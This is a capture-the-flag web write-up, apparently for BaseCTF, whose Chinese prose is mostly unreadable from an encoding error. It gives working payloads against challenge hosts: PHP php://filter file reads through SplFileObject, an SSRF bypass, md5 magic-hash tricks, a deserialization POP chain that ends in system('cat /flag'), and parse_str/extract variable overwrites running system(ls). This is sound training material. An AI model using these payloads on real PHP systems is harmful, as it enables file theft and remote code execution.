# web��wp #
## ����Ϊ����basectf��wp��� ##
<https://gz.imxbt.cn/games/13/challenges#>
![ picture](./img/1-1738566658915-1.png)
*�ܼ򵥵�һ����Ŀ��ֱ����pythonд�����򼴿ɡ�*

������һ��ʾ�� ~~д���е�ʷɽ���������þ���~~
```python
from bs4 import BeautifulSoup  
import requests  
def calculate(method,num1,num2):  
    if method == 1:  
        return num1 * num2  
    elif method == 2:  
        return num1 // num2  
    elif method == 3:  
        return num1 + num2  
    elif method == 4:  
        return num1 - num2  
    else:  
        print("������©�������")  
        return 0  
url = "http://gz.imxbt.cn:20095/"  
session = requests.Session()  
ooo = 0  
result = 0  
while ooo < 60:  
    ooo += 1  
    data = {'answer': result}  
    response = session.post(url, data=data)  
    print(response.text)  
    soup = BeautifulSoup(response.text, "html.parser")  
    content = soup.prettify()  
    ok = False  
    num1 = ""  
    num2 = ""  
    method = 0  
    first = True  
    for i in content:  
        if i == "?":  
            break  
        if i == "d":  
            ok = True  
            continue  
        if ok:  
            if i != " " and first:  
                try:  
                    int(i)  
                    num1 += i  
                except ValueError:  
                    if i == "��":  
                        method = 1  
                    elif i == "��":  
                        method = 2  
                    elif i == "+":  
                        method = 3  
                    elif i == "-":  
                        method = 4  
                    first = False  
            if not first and i != "��" and i != "��" and i != "+" and i != "-":  
                num2 += i  
    print(num1,num2)  
    num1 = int(num1)  
    num2 = int(num2)  
    result = calculate(method, num1, num2)  
    print(result)  
```

***

*�ǳ��õĴ������*
![picture](./img/2-1738566658916-4.png)
��Ҫ�ǿ���php�����Ժ�αЭ�飬������˵��ֱ���Ͻű�

``` python
import requests
res = requests.post("http://gz.imxbt.cn:20099/index.php?e[m.p=114514.1&a=SplFileObject&b=php://filter/read=convert.base64-encode/resource=flag.php&c=__toString",data = {"try":"-"*1000001+"HACKER"})
print(res.text)
```
***
![picture](./img/3-1738566658916-2.png)
����αЭ���SSRF  
��һ���Ƕ�ȡ���ļ�������data://text/plain,Aura  
�ڶ���ֱ�Ӵ������url���ɣ�ͬʱ�����и�SSRF©����ע�⵽��ҳ���������ַ���������ֱ��@127.0.0.1�Ϳ�����   
������gift���ö�˵��ֱ��php://filter/convert.base64-encode/resource=flag.php   


***

![picture](./img/4-1738566658916-3.png)
����php��   
`$dir`����࣬Ҫ�����ǿɵ���������Ҫ���Ǳ����ļ�����ֱ�Ӵ��� `K=DirectoryIterator&W=/secret/`   ������һ��`f11444g.php`
�����ִ������һ����,����αЭ���ȡ`J=SplFileObject&H=php://filter/read=convert.base64-encode/resource=/secret/f11444g.php`

![picture](./img/5-1738566658916-5.png)
����md5   
�����Ƚϣ���ǿ�Ƚ�   
name��password�ܼ򵥣�ֱ������md5��ͷΪ0e���ַ������ɣ�0e�ᱻ��Ϊ�ǿ�ѧ��������
name2��password2Ҳ��ֻ࣬��Ҫ�������飬�����md5����ARRAY����ַ�����md5

***

![picture](./img/6-1738566658916-6.png)  
��ʼ�����л���ħ����������Щ������ķ�����������ħ��������������Լ�ȥ�˽⣬����ֻ�����õ�   
GET����ser�󴥷�web��wakeup�������kwҪ����ƴ���ַ���������toString,

���if������ˣ��Ǿ���һ����δ�������ط����ֹ���$nonono��Ҳ�ʹ�����__get��get����ᴥ��getflag������Misc���getflag�������õģ�����overҪ��misc��

���������ser�ᷴ���л������������ȱ�����һ��
``` php
<?php
highlight_file(__FILE__);
error_reporting(0);

class re{
    public $chu0;
    public function __toString(){
        if(!isset($this->chu0)){
            return "I can not believes!";
        }
        $this->chu0->$nononono;
    }
}

class web {
    public $kw;
    public $dt;

    public function __wakeup() {
        echo "lalalla".$this->kw;
    }

    public function __destruct() {
        echo "ALL Done!";
    }
}

class pwn {
    public $dusk;
    public $over;

    public function __get($name) {
        if($this->dusk != "gods"){
            echo "ʲô���㾹�Ҳ��Ͽ�?";
        }
        $this->over->getflag();
    }
}

class Misc {
    public $nothing;
    public $flag;

    public function getflag() {
        eval("system('cat /flag');");
    }
}

class Crypto {
    public function __wakeup() {
        echo "happy happy happy!";
    }

    public function getflag() {
        echo "you are over!";
    }
}
$a = new re();
$b = new web();
$c = new pwn();
$d = new Misc();
//��kw��ֵ]
$b -> kw = $a;
//chu0��ֵ
$a -> chu0 = $c;
//dusk
$c -> dusk = "gods";
$c -> over = $d;
echo serialize($a);
?>

```
�õ����ֱ�Ӵ���ȥ����

![alt text](./img/80e4d682-e3a7-45f3-a95e-18ef227e7468.png)
parse_str()�������ڰѲ�ѯ�ַ��������������У����û��array���������ɸú������õı����������Ѵ��ڵ�ͬ�����������±�������©����  
�������������Լ�����������֪��

Ҫʹ��һ��ifΪfalse���Լ�����ڶ���if�����Ҫ����f l a g 1 �� flag1��flag1��flag2����ֵΪ8gen1
Ҫ������������ĸ�if����Ҫ��POST����504_SYS.COM��sys������sys��ֵ��Ҫ�ƹ����ĸ�if�ڵķ���
����parse_str()�����Լ�extract()��������Ҫ����POST���flag1��flag2����ֵΪ8gen1  
``` 
GET
?_POST[flag1]=8gen1&_POST[flag2]=8gen1
```
Ȼ��͹��˵�һ�㡣�ڶ����504_SYS.COMҪ��[��]��.�������ƹ���������504[SYS.COM���������Ǹ�.�������ˡ����һ����������sys=system(ls);����һ�¡����ֶ�����flag.php��index.php����������.��ͨ������������ˣ������޷�������ȡflag.php�ˡ�
������flag.php��Դ�����Ѿ��������ˣ�����ֱ�����flag��������Ϳ��ԣ���Ϊһ�㶼����phpִ���и�flag���������ֵ�ģ�����payload��
![alt text](./img/0ec678f7-761b-48d0-a20c-5643e5b9b5c3.png)

